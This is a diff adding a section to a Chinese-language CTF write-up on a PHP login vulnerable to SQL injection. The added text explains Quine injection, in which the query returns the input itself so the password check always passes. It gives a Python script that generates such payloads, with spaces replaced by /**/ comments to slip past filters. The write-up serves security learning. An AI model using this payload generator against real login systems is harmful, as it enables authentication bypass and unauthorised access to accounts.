@@ -92,4 +92,28 @@ if(isset($_GET['source'])){
 SELECT password FROM users WHERE username='admin' and password='$password';
 ```
 会执行这条语句，其中`$password`是我们控制的。
-这里按理来说其实是可以打盲注的。但是
+这里按理来说其实是可以打盲注的。但是这里我们打Quine注入更简单，因为如果让查询结果等于输入，那我们的条件不久永真了吗，
+这里有脚本
+```python
+sql = input ("输入你的sql语句,不用写关键查询的信息  形如 1'union select #\n")
+sql2 = sql.replace("'",'"')
+base = "replace(replace('.',char(34),char(39)),char(46),'.')"
+final = ""
+def add(string):
+    if ("--+" in string):
+        tem = string.split("--+")[0] + base + "--+"
+    if ("#" in string):
+        tem = string.split("#")[0] + base + "#"
+    return tem
+def patch(string,sql):
+    if ("--+" in string):
+        return sql.split("--+")[0] + string + "--+"
+    if ("#" in string):
+        return sql.split("#")[0] + string + "#"
+
+res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'"."')
+
+print(res)
+```
+![](assets/Quine注入/file-20251217195614491.png)
+就帮我们构造好了
